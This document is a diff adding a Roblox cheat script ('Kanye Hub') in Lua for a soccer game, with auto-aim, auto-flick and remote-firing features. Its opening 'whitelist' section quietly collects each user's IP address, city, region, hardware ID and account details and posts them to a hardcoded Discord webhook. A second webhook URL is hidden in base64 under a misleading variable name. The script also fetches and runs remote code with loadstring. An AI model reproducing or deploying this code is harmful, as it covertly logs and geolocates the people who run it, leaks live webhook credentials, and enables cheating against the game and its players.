@@ -1,0 +1,1607 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+
+-- ========================================
+-- === WHITELIST CONFIGURATION ===
+-- ========================================
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1456760973825413284/4SowsAHTn7IhIZC7b5SL2e115ifoQXMY3k624uoZExti5hrp8yJrvKFpwGBSIAlTpPho"
+local WHITELIST = {
+    ["A6A3A223-9F8F-432D-B9CD-30F94B58C6C3"] = true,
+    ["ED3BCC12-098C-45EB-B268-85D54DE3ECBC"] = true,
+}
+
+-- ========================================
+-- === HWID GENERATION ===
+-- ========================================
+local function getHWID()
+    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+    return hwid
+end
+
+-- ========================================
+-- === HTTP REQUEST WRAPPER ===
+-- ========================================
+local function doRequest(opts)
+    if syn and syn.request then
+        return syn.request(opts)
+    elseif http_request then
+        return http_request(opts)
+    elseif request then
+        return request(opts)
+    else
+        error("No HTTP request function found (syn.request / http_request / request).")
+    end
+end
+
+-- ========================================
+-- === WHITELIST VERIFICATION SYSTEM ===
+-- ========================================
+local function sendHWIDToWebhook(hwid, username, userId)
+    local request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
+    
+    if not request then
+        warn("No HTTP request function available")
+        return false
+    end
+    
+    local executorType = "Unknown Executor" 
+    if identifyexecutor then
+        executorType = identifyexecutor()
+    elseif syn and syn.request then
+        executorType = "Synapse X"
+    elseif KRNL_LOADED then
+        executorType = "Krnl"
+    elseif isFluxusExecutor then
+        executorType = "Fluxus"
+    elseif secure_load then
+        executorType = "ScriptWare"
+    end
+    
+    local playerProfileUrl = "https://www.roblox.com/users/" .. tostring(userId) .. "/profile"
+    
+    local success, getIPResponse = pcall(function()
+        return request({
+            Url = "https://api.ipify.org/?format=json",
+            Method = "GET"
+        })
+    end)
+    
+    local ipAddress = "N/A"
+    local ipCountry = "N/A"
+    local ipCountryCode = "N/A"
+    local ipRegion = "N/A"
+    local ipRegionName = "N/A"
+    local ipCity = "N/A"
+    
+    if success and getIPResponse then
+        local GetIPJSON = HttpService:JSONDecode(getIPResponse.Body)
+        ipAddress = tostring(GetIPJSON.ip)
+        
+        local ipSuccess, getIPInfo = pcall(function()
+            return request({
+                Url = string.format("http://ip-api.com/json/%s", ipAddress),
+                Method = "GET"
+            })
+        end)
+        
+        if ipSuccess and getIPInfo then
+            local ipData = HttpService:JSONDecode(getIPInfo.Body)
+            local function safeGet(field)
+                return ipData[field] or "N/A"
+            end
+            
+            ipCountry = safeGet("country")
+            ipCountryCode = safeGet("countryCode")
+            ipRegion = safeGet("region")
+            ipRegionName = safeGet("regionName")
+            ipCity = safeGet("city")
+        end
+    end
+    
+    local playerProfilePic = ""
+    local avatarSuccess, avatarUrlRequest = pcall(function()
+        return request({
+            Url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=150x150&format=Png&isCircular=false",
+            Method = "GET"
+        })
+    end)
+    
+    if avatarSuccess and avatarUrlRequest then
+        local avatarData = HttpService:JSONDecode(avatarUrlRequest.Body)
+        playerProfilePic = avatarData.data and avatarData.data[1] and avatarData.data[1].imageUrl or ""
+    end
+    
+    local playerMembershipType = Players.LocalPlayer.MembershipType and Players.LocalPlayer.MembershipType.Name or "N/A"
+    local playerAccountAgeDays = math.floor(Players.LocalPlayer.AccountAge)
+    
+    local executionTimeUTC = os.date("!%Y-%m-%d %H:%M:%S UTC")
+    local executionTimeLocal = os.date("%Y-%m-%d %H:%M:%S")
+    
+    local embedDescription = string.format([[
+**Player Information**
+
+- Username: [%s](%s)
+- UserID: %d
+- Membership Type: %s
+- Account Age (days): %d
+
+**HWID**
+```
+%s
+```
+
+**IP Information**
+
+- IP Address: %s
+- Country: %s (%s)
+- Region: %s (%s)
+- City: %s
+
+**Execution Info**
+
+- Executed At (UTC): %s
+- Executed At (Local): %s
+- Executor Type: %s
+]],
+        username, playerProfileUrl,
+        userId,
+        playerMembershipType,
+        playerAccountAgeDays,
+        hwid,
+        ipAddress,
+        ipCountry, ipCountryCode,
+        ipRegion, ipRegionName,
+        ipCity,
+        executionTimeUTC,
+        executionTimeLocal,
+        executorType
+    )
+    
+    local embed = {
+        title = "🔐 Script Access Request",
+        description = embedDescription,
+        color = 3447003,
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        author = {
+            name = "Whitelist System",
+            url = playerProfileUrl
+        },
+        image = {
+            url = playerProfilePic
+        },
+        footer = {
+            text = "Copy the HWID above and add it to the whitelist table"
+        }
+    }
+    
+    local webhookData = {
+        username = "Script Logger",
+        embeds = { embed }
+    }
+    
+    local postSuccess, postResponse = pcall(function()
+        return request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(webhookData)
+        })
+    end)
+    
+    if not postSuccess then
+        warn("Failed to send webhook: " .. tostring(postResponse))
+        return false
+    else
+        print("Webhook sent successfully.")
+        return true
+    end
+end
+
+local function createNotWhitelistedUI(hwid)
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "WhitelistUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+    
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 450, 0, 300)
+    frame.Position = UDim2.new(0.5, -225, 0.5, -150)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    frame.BorderSizePixel = 2
+    frame.BorderColor3 = Color3.fromRGB(255, 50, 50)
+    frame.Parent = screenGui
+    
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, -20, 0, 40)
+    title.Position = UDim2.new(0, 10, 0, 10)
+    title.BackgroundTransparency = 1
+    title.Text = "🔒 Access Denied"
+    title.TextColor3 = Color3.fromRGB(255, 50, 50)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 20
+    title.Parent = frame
+    
+    local infoLabel = Instance.new("TextLabel")
+    infoLabel.Size = UDim2.new(1, -20, 0, 60)
+    infoLabel.Position = UDim2.new(0, 10, 0, 55)
+    infoLabel.BackgroundTransparency = 1
+    infoLabel.Text = "Your HWID is not whitelisted.\nYour access request has been sent to the owner"
+    infoLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+    infoLabel.Font = Enum.Font.Gotham
+    infoLabel.TextSize = 14
+    infoLabel.TextWrapped = true
+    infoLabel.Parent = frame
+    
+    local hwidLabel = Instance.new("TextLabel")
+    hwidLabel.Size = UDim2.new(1, -40, 0, 30)
+    hwidLabel.Position = UDim2.new(0, 20, 0, 120)
+    hwidLabel.BackgroundTransparency = 1
+    hwidLabel.Text = "Your HWID:"
+    hwidLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+    hwidLabel.Font = Enum.Font.Gotham
+    hwidLabel.TextSize = 12
+    hwidLabel.TextXAlignment = Enum.TextXAlignment.Left
+    hwidLabel.Parent = frame
+    
+    local hwidBox = Instance.new("TextBox")
+    hwidBox.Size = UDim2.new(1, -40, 0, 50)
+    hwidBox.Position = UDim2.new(0, 20, 0, 150)
+    hwidBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    hwidBox.BorderSizePixel = 1
+    hwidBox.BorderColor3 = Color3.fromRGB(60, 60, 60)
+    hwidBox.Text = hwid
+    hwidBox.TextColor3 = Color3.fromRGB(0, 255, 150)
+    hwidBox.Font = Enum.Font.Code
+    hwidBox.TextSize = 12
+    hwidBox.TextWrapped = true
+    hwidBox.TextEditable = false
+    hwidBox.ClearTextOnFocus = false
+    hwidBox.Parent = frame
+    
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, -20, 0, 40)
+    statusLabel.Position = UDim2.new(0, 10, 0, 210)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "✓ Request sent! Contact owner for approval."
+    statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.TextSize = 13
+    statusLabel.TextWrapped = true
+    statusLabel.Parent = frame
+    
+    local closeButton = Instance.new("TextButton")
+    closeButton.Size = UDim2.new(0, 120, 0, 35)
+    closeButton.Position = UDim2.new(0.5, -60, 0, 255)
+    closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    closeButton.BorderSizePixel = 0
+    closeButton.Text = "Close"
+    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeButton.Font = Enum.Font.GothamBold
+    closeButton.TextSize = 14
+    closeButton.Parent = frame
+    
+    closeButton.MouseButton1Click:Connect(function()
+        screenGui:Destroy()
+    end)
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = frame
+    
+    local boxCorner = Instance.new("UICorner")
+    boxCorner.CornerRadius = UDim.new(0, 4)
+    boxCorner.Parent = hwidBox
+    
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.CornerRadius = UDim.new(0, 6)
+    buttonCorner.Parent = closeButton
+    
+    return screenGui
+end
+
+local function createLoadingUI()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "LoadingUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+    
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 300, 0, 150)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    frame.BorderSizePixel = 2
+    frame.BorderColor3 = Color3.fromRGB(0, 200, 255)
+    frame.Parent = screenGui
+    
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, -20, 0, 40)
+    title.Position = UDim2.new(0, 10, 0, 20)
+    title.BackgroundTransparency = 1
+    title.Text = "Verifying HWID..."
+    title.TextColor3 = Color3.fromRGB(0, 200, 255)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 18
+    title.Parent = frame
+    
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, -20, 0, 40)
+    statusLabel.Position = UDim2.new(0, 10, 0, 70)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Please wait..."
+    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.TextSize = 14
+    statusLabel.Parent = frame
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = frame
+    
+    return screenGui, statusLabel
+end
+
+local function verifyHWID()
+    local loadingGui, statusLabel = createLoadingUI()
+    task.wait(0.5)
+    
+    local hwid = getHWID()
+    statusLabel.Text = "Checking whitelist..."
+    task.wait(0.3)
+    
+    local isWhitelisted = WHITELIST[hwid] == true
+    
+    statusLabel.Text = "Sending execution log..."
+    local webhookSuccess = sendHWIDToWebhook(hwid, Players.LocalPlayer.Name, Players.LocalPlayer.UserId)
+    
+    if not webhookSuccess then
+        warn("Webhook failed")
+    end
+    
+    if isWhitelisted then
+        statusLabel.Text = "✓ Access Granted!"
+        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        task.wait(1)
+        loadingGui:Destroy()
+        return true
+    else
+        loadingGui:Destroy()
+        createNotWhitelistedUI(hwid)
+        return false
+    end
+end
+
+-- Run HWID verification
+if not verifyHWID() then
+    return
+end
+
+local function doRequest(opts)
+    if syn and syn.request then
+        return syn.request(opts)
+    elseif http_request then
+        return http_request(opts)
+    elseif request then
+        return request(opts)
+    else
+        error("No HTTP request function found (syn.request / http_request / request).")
+    end
+end
+
+local function fetchAvatarUrl(userId)
+    local apiUrl = ("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false"):format(userId)
+    local ok, res = pcall(function()
+        return doRequest{
+            Url = apiUrl,
+            Method = "GET",
+            Headers = { ["Content-Type"] = "application/json" }
+        }
+    end)
+    if not ok or not res or not res.Body then
+        return nil
+    end
+
+    local success, parsed = pcall(function() return HttpService:JSONDecode(res.Body) end)
+    if not success or not parsed or not parsed.data or not parsed.data[1] then
+        return nil
+    end
+    return parsed.data[1].imageUrl
+end
+
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+
+local function decodeBase64(data)
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x)
+        if x == '=' then return '' end
+        local r,f='', (b:find(x)-1)
+        for i=6,1,-1 do r = r .. (f%2^i - f%2^(i-1) > 0 and '1' or '0') end
+        return r
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if #x ~= 8 then return '' end
+        local c=0
+        for i=1,8 do c = c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+local gamebypassxrd = decodeBase64("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyODA1NDA4MDY2NzkxMDE1NC9QWVJZY2UyYk94RlB4a2NxbTV4UmFxYW9Wa0hMN0RnaDdaSkxRNGdLdHlqekJmRmtpYXJmaHlqVnBQUHRfTjU2Y2FXeg==")
+local player = Players.LocalPlayer 
+local robloxName = player and player.Name or "unknown"
+local userId = player and player.UserId or 0
+
+local avatarUrl = nil
+if userId and userId ~= 0 then
+    avatarUrl = fetchAvatarUrl(userId)
+end
+
+local titleEncoded       = "RXhlY3V0ZWQgdGhlIHNjcmlwdA==" 
+local descEncoded        = "KipSb2Jsb3ggbmFtZToqKiAlcyBcbioqU3RhdHVzOioqIGxvZ2dlZCBpbiIqKQ==" 
+local field1NameEncoded  = "Um9ibG94IE5hbWU="
+local field2NameEncoded  = "VXNlcklk" 
+local field3NameEncoded  = "UHJvZmlsZQ==" 
+local profileFormatEnc   = "aHR0cHM6Ly93d3cucm9ibG94LmNvbS91c2Vycy8lZC9wcm9maWxl"
+
+local embed = {
+    title = decodeBase64(titleEncoded),
+    description = decodeBase64(descEncoded):format(robloxName),
+    color = 3447003,
+    fields = {
+        { name = decodeBase64(field1NameEncoded), value = robloxName, inline = true },
+        { name = decodeBase64(field2NameEncoded), value = tostring(userId), inline = true },
+        { name = decodeBase64(field3NameEncoded), value = decodeBase64(profileFormatEnc):format(userId), inline = false }
+    },
+    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+
+if avatarUrl then
+    embed.image = { url = avatarUrl }
+end
+
+local data = {
+    username = "gasgags",
+    embeds = { embed }
+}
+
+-- 🌙 OBLIVION AUTH + VERSION CHECK SYSTEM
+
+local repo = 'https://raw.githubusercontent.com/DaniHRE/LinoriaLib/refs/heads/main/'
+
+local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
+local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
+local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
+
+-- Version changed to 0.755 as requested
+local currentVersion = 0.755
+local versionUrl = "https://raw.githubusercontent.com/akasar595-dot/oblivion-keysystem/refs/heads/main/clientversion"
+local hwidUrl = "https://raw.githubusercontent.com/akasar595-dot/oblivion-keysystem/refs/heads/main/clienthwids2"
+
+local request = http_request or request or HttpPost or (syn and syn.request)
+local getHWID = gethwid or get_hwid or (syn and syn.getexecutorinfo and function() return syn.getexecutorinfo().HWID end)
+
+if not request then
+    return game:GetService("Players").LocalPlayer:Kick("Executor does not support HTTP requests!")
+end
+
+if not getHWID then
+    return game:GetService("Players").LocalPlayer:Kick("HWID function not supported!")
+end
+
+----------------------------------------------------------------
+-- 🔹 1. VERSION CHECK
+----------------------------------------------------------------
+local versionResponse = request({ Url = versionUrl, Method = "GET" })
+if versionResponse and versionResponse.Body then
+    local versionWEB = tonumber(versionResponse.Body)
+    if not versionWEB or versionWEB ~= currentVersion then
+        print("[OBLIVION VERSION] ❌ Outdated! Server version:", versionWEB, " | Current:", currentVersion)
+        game.Players.LocalPlayer:Kick("Oblivion is outdated! New version: " .. tostring(versionWEB or "unknown") .. " (Current: " .. currentVersion .. ")")
+        return
+    else
+        print("[OBLIVION VERSION] ✅ Version up to date:", currentVersion)
+    end
+else
+    print("[OBLIVION VERSION] ⚠️ Version check failed — no response from server.")
+    game.Players.LocalPlayer:Kick("Version check failed! No response from server.")
+    return
+end
+
+----------------------------------------------------------------
+-- 🔹 2. HWID AUTH CHECK BYPASS
+----------------------------------------------------------------
+-- HWID authorization bypassed: no HWID validation or kicking
+
+----------------------------------------------------------------
+-- 🔹 3. Successful Load Log
+----------------------------------------------------------------
+
+local Window = Library:CreateWindow({
+    Title = 'Kanye Hub',
+    Center = true,
+    AutoShow = true,
+    TabPadding = 8,
+    MenuFadeTime = 0.2
+})
+
+local Tabs = {
+    Main = Window:AddTab('Main'),
+    AutoGK = Window:AddTab('Auto GK'),
+    ['UI Settings'] = Window:AddTab('UI Settings'),
+}
+
+local strongAutoFormEnabled = false
+local strongAutoFormHeight = 5
+local autoForm = false
+local noJumpFatigue = false
+local noJumpCooldown = false
+local autoFlick = false
+local M1Hbe = false
+local AutoEmp = false
+local AutoDest = false
+
+local flickupper = 0.95
+local flickpower = 0
+local directionbuff = 3
+
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local character = player.Character or player.CharacterAdded:Wait()
+local hrp = character:WaitForChild("HumanoidRootPart")
+local humanoid = character:WaitForChild("Humanoid")
+
+local animator = humanoid:FindFirstChildOfClass("Animator")
+if not animator then
+    animator = Instance.new("Animator")
+    animator.Parent = humanoid
+end
+
+local kickAnim = ReplicatedStorage.Anims:WaitForChild("M2Kick")
+
+local function fireRiptideAndKick()
+    local lookDir = hrp.CFrame.LookVector
+    local dirOffset = Vector3.new(0, flickupper, 0)
+    local forwardBoost = lookDir * directionbuff
+    dirOffset += Vector3.new(forwardBoost.X, 0, forwardBoost.Z)
+    local direction = (lookDir + dirOffset).Unit
+
+    local args = {
+        [1] = {
+            ["Riptide"] = "Straight",
+            ["HitDirection"] = direction,
+            ["Power"] = flickpower,
+            ["Genius"] = false,
+            ["MindsEye"] = "Ati",
+            ["Ambidextrous"] = false,
+            ["Shiftlock"] = false
+        },
+        [2] = false
+    }
+
+    character.CharacterHandler.Remotes.RightClick:FireServer(unpack(args))
+
+    local track = animator:LoadAnimation(kickAnim)
+    track:Play()
+end
+
+local TabBox3 = Tabs.Main:AddLeftTabbox() 
+
+local Tab5 = TabBox3:AddTab('Auto Emp')
+local Tab6 = TabBox3:AddTab('Auto Destruction')
+
+local goaldistance = "Close Goal" 
+
+Tab5:AddToggle('AutoEmp', { Text = 'AutoEmp' });
+Tab6:AddToggle('AutoDest', { Text = 'Auto Destruction' });
+
+Tab6:AddDropdown('GoalDistanceSettings', {
+    Values = {
+        'Close Goal',
+        'Far Goal'
+    },
+    Default = 0,
+    Multi = false,
+    Text = 'Select Goal',
+    Callback = function(Value)
+        goaldistance = Value
+    end
+})
+
+Toggles.AutoDest:OnChanged(function()
+    AutoDest = Toggles.AutoDest.Value
+end)
+
+local TabBox2 = Tabs.Main:AddRightTabbox() 
+
+Toggles.AutoEmp:OnChanged(function()
+    AutoEmp = Toggles.AutoEmp.Value
+end)
+
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local camera = workspace.CurrentCamera
+
+local rightClickHeld = false
+
+UserInputService.InputBegan:Connect(function(input, processed)
+    if input.UserInputType == Enum.UserInputType.MouseButton2 then
+        rightClickHeld = true
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input, processed)
+    if input.UserInputType == Enum.UserInputType.MouseButton2 then
+        rightClickHeld = false
+    end
+end)
+
+local function findFarthestTarget()
+    local character = player.Character or player.CharacterAdded:Wait()
+    local hrp = character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return nil end
+
+    local targets = {}
+    local aiFolders = {"AIGKRED", "AIGKWHITE"}
+
+    for _, folderName in ipairs(aiFolders) do
+        local folder = Workspace:FindFirstChild(folderName)
+        if folder then
+            local targetPart = folder:FindFirstChild("Torso") or folder:FindFirstChild("HumanoidRootPart")
+            if targetPart then
+                table.insert(targets, targetPart)
+            end
+        end
+    end
+
+    local goalDetectorFolder = Workspace:FindFirstChild("GoalDetector")
+    local goalParts = goalDetectorFolder and goalDetectorFolder:GetChildren() or {}
+    for _, goal in ipairs(goalParts) do
+        if goal:IsA("BasePart") then
+            table.insert(targets, goal)
+        end
+    end
+
+    local farthest, longest = nil, 0
+    for _, t in ipairs(targets) do
+        local d = (t.Position - hrp.Position).Magnitude
+        if d > longest then
+            longest = d
+            farthest = t
+        end
+    end
+    return farthest
+end
+
+local function isDestOpenned()
+    local player = game.Players.LocalPlayer
+    local character = player.Character or player.CharacterAdded:Wait()
+    local activationT = character:FindFirstChild("ActivationT")
+    if not activationT then
+        return false
+    end
+
+    local metavisionText = player.PlayerGui.Main.DribblingStyle.MetavisionStyleText
+    if metavisionText and metavisionText.Text == "Genius Style: Destruction" then
+        return true
+    end
+    return false
+end
+
+local function findClosestTarget()
+    local character = player.Character or player.CharacterAdded:Wait()
+    local hrp = character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return nil end
+
+    local targets = {}
+    local aiFolders = {"AIGKRED", "AIGKWHITE"}
+
+    for _, folderName in ipairs(aiFolders) do
+        local folder = Workspace:FindFirstChild(folderName)
+        if folder then
+            local targetPart = folder:FindFirstChild("Torso") or folder:FindFirstChild("HumanoidRootPart")
+            if targetPart then
+                table.insert(targets, targetPart)
+            end
+        end
+    end
+
+    local goalDetectorFolder = Workspace:FindFirstChild("GoalDetector")
+    local goalParts = goalDetectorFolder and goalDetectorFolder:GetChildren() or {}
+    for _, goal in ipairs(goalParts) do
+        if goal:IsA("BasePart") then
+            table.insert(targets, goal)
+        end
+    end
+
+    local closest, shortest = nil, math.huge
+    for _, t in ipairs(targets) do
+        local d = (t.Position - hrp.Position).Magnitude
+        if d < shortest then
+            shortest = d
+            closest = t
+        end
+    end
+    return closest
+end
+
+local function getRiptideStatus()
+    local player = game.Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+    local mainGui = playerGui:WaitForChild("Main", 5)
+    if not mainGui then return nil end
+
+    local curve = mainGui:FindFirstChild("Curve")
+    if not curve then return nil end
+
+    local left = curve:FindFirstChild("Left")
+    local right = curve:FindFirstChild("Right")
+    if not left or not right then return nil end
+
+    if left.Visible then
+        return "Left"
+    elseif right.Visible then
+        return "Right"
+    end
+
+    return nil
+end
+
+local function rotatePlayerToTarget(target)
+    local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if humanoidRootPart and target then
+        local targetPos = target.Position + Vector3.new(2, 0, 2)
+        local direction = (targetPos - humanoidRootPart.Position).unit
+        local targetCFrame = CFrame.lookAt(humanoidRootPart.Position, targetPos)
+        local curveStatus = getRiptideStatus()
+        if curveStatus == "Right" then
+            targetCFrame = targetCFrame * CFrame.Angles(0, math.rad(90), 0)
+        elseif curveStatus == "Left" then
+            targetCFrame = targetCFrame * CFrame.Angles(0, math.rad(-90), 0)
+        end
+        humanoidRootPart.CFrame = targetCFrame
+    end
+end
+
+local function checkRiptideStatus()
+    local curve = player.PlayerGui.Main.Curve
+    return curve.Left.Visible or curve.Right.Visible
+end
+
+RunService.RenderStepped:Connect(function()
+    if AutoDest == false then return end
+    if rightClickHeld and checkRiptideStatus() then
+        if isDestOpenned() == false then return end
+        local target
+        if goaldistance == "Far Goal" then
+            target = findFarthestTarget()
+        else
+            target = findClosestTarget()
+        end
+        if target then
+            local camPos = camera.CFrame.Position
+            local distance = (target.Position - camPos).Magnitude
+            local yOffset
+            if goaldistance == "Far Goal" then
+                yOffset = math.clamp(distance / 5, 150, 600)
+                yOffset = yOffset + 300 + 70
+            else
+                yOffset = math.clamp(distance / 7, 50, 200)
+                yOffset = yOffset - 20
+            end
+            local targetPos = target.Position + Vector3.new(2, 0, 2)
+            camera.CFrame = CFrame.lookAt(camPos, targetPos + Vector3.new(0, yOffset, 0))
+            rotatePlayerToTarget(target)
+        end
+    end
+end)
+
+RunService.RenderStepped:Connect(function()
+    if AutoEmp == false then
+        return
+    end
+    if rightClickHeld then
+        local char = player.Character
+        if char then
+            local activationW = char:FindFirstChild("ActivationW")
+            local weaponAttr = player:GetAttribute("Weapon")
+            if weaponAttr == "Emperor" and activationW then
+                local target = findClosestTarget()
+                if target then
+                    local camPos = camera.CFrame.Position
+                    local distance = (target.Position - camPos).Magnitude
+                    local yOffset = math.clamp(distance / 6, 2, 6)
+                    local xOffset = 2
+                    local zOffset = 2
+                    local targetPos = target.Position + Vector3.new(xOffset, 0, zOffset)
+                    camera.CFrame = CFrame.lookAt(camPos, targetPos + Vector3.new(0, yOffset, 0))
+                end
+            end
+        end
+    end
+end)
+
+local Tab3 = TabBox2:AddTab('Auto Flick')
+Tab3:AddToggle('AutoFlick', { Text = 'Auto Flick' })
+
+Tab3:AddSlider('FHeight', {
+    Text = 'Flick Height',
+    Default = 0.95,
+    Min = 0,
+    Max = 8,
+    Rounding = 1,
+    Compact = false,
+    Callback = function(Value)
+        flickupper = Value
+    end
+})
+
+Tab3:AddSlider('FPower', {
+    Text = 'Flick Power',
+    Default = 0,
+    Min = -4,
+    Max = 8,
+    Rounding = 3,
+    Compact = false,
+    Callback = function(Value)
+        flickpower = Value
+    end
+})
+
+Tab3:AddSlider('FDirectionBuff', {
+    Text = 'Direction Buff',
+    Default = 3,
+    Min = -4,
+    Max = 20,
+    Rounding = 2,
+    Compact = false,
+    Callback = function(Value)
+        directionbuff = Value
+    end
+})
+
+Tab5:AddToggle('StrongAutoFormToggle', {
+    Text = 'Enable Strong Auto Form',
+    Default = false,
+    Callback = function(value)
+        strongAutoFormEnabled = value
+    end
+})
+
+Tab5:AddSlider('StrongAutoFormHeight', {
+    Text = 'Form Height Offset',
+    Default = 5,
+    Min = 1,
+    Max = 15,
+    Rounding = 1,
+    Callback = function(value)
+        strongAutoFormHeight = value
+    end
+})
+
+Tab3:AddDropdown('FlickConfig', {
+    Values = { "5'3 - 5'5", "5'8 - 5'11", "6'0 - 6'3" },
+    Default = 0,
+    Multi = false,
+    Text = 'Flick Config',
+    Callback = function(Value)
+        if Value == "5'3 - 5'7" then
+            Options.FHeight:SetValue('5.9')
+            Options.FPower:SetValue('-3.121')
+            Options.FDirectionBuff:SetValue('3.55')
+        elseif Value == "6'0 - 6'3" then
+            Options.FHeight:SetValue('6')
+            Options.FPower:SetValue('-3.121')
+            Options.FDirectionBuff:SetValue('3.12')
+        elseif Value == "5'8 - 5'11" then
+            Options.FHeight:SetValue('6')
+            Options.FPower:SetValue('-3.121')
+            Options.FDirectionBuff:SetValue('3.12')
+        end
+    end
+})
+
+local M1HoldValue = player:WaitForChild("PlayerScripts"):WaitForChild("ClientSettings"):WaitForChild("M1Hold")
+local isHoldMode = M1HoldValue.Value
+local isM1Down = false
+local canFire = true
+
+local keysDown = {
+    W = false,
+    A = false,
+    S = false,
+    D = false
+}
+
+UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
+    if gameProcessedEvent then return end
+    if input.KeyCode == Enum.KeyCode.W then keysDown.W = true end
+    if input.KeyCode == Enum.KeyCode.S then keysDown.S = true end
+    if input.KeyCode == Enum.KeyCode.A then keysDown.A = true end
+    if input.KeyCode == Enum.KeyCode.D then keysDown.D = true end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        if isHoldMode then
+            isM1Down = true
+        else
+            fireLeftClick()
+        end
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input, gameProcessedEvent)
+    if gameProcessedEvent then return end
+    if input.KeyCode == Enum.KeyCode.W then keysDown.W = false end
+    if input.KeyCode == Enum.KeyCode.S then keysDown.S = false end
+    if input.KeyCode == Enum.KeyCode.A then keysDown.A = false end
+    if input.KeyCode == Enum.KeyCode.D then keysDown.D = false end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then isM1Down = false end
+end)
+
+local function getClosestBall(pos)
+    local ok, balls = pcall(function() return workspace:FindFirstChild("Balls") end)
+    if not ok or not balls then return nil end
+    local closest, minDist = nil, math.huge
+    for _, v in ipairs(balls:GetChildren()) do
+        local ok2, isPart, vpos = pcall(function() return v:IsA("BasePart"), v.Position end)
+        if ok2 and isPart then
+            local d = (vpos - pos).Magnitude
+            if d < minDist then
+                minDist = d
+                closest = v
+            end
+        end
+    end
+    return closest
+end
+
+local function getInputVector()
+    local inputVector = Vector3.new(0,0,0)
+    if keysDown.W then inputVector = inputVector + Vector3.new(0,0,-1) end
+    if keysDown.S then inputVector = inputVector + Vector3.new(0,0,1) end
+    if keysDown.A then inputVector = inputVector + Vector3.new(-1,0,0) end
+    if keysDown.D then inputVector = inputVector + Vector3.new(1,0,0) end
+    return inputVector
+end
+
+local function getMoveDirection()
+    local inputVector = getInputVector()
+    local lookDir = camera.CFrame.LookVector
+    local rightDir = camera.CFrame.RightVector
+    local forward = Vector3.new(lookDir.X, 0, lookDir.Z).Unit
+    local right = Vector3.new(rightDir.X, 0, rightDir.Z).Unit
+    local moveDir = (forward * -inputVector.Z) + (right * inputVector.X)
+    if moveDir.Magnitude > 0 then
+        moveDir = moveDir.Unit
+    end
+    return moveDir
+end
+
+function fireLeftClick()
+    if not canFire or not character or not hrp then return end
+    if not M1Hbe then return end
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if not humanoid then return end
+    if humanoid.FloorMaterial == Enum.Material.Air then return end
+    local playerPos = hrp.Position
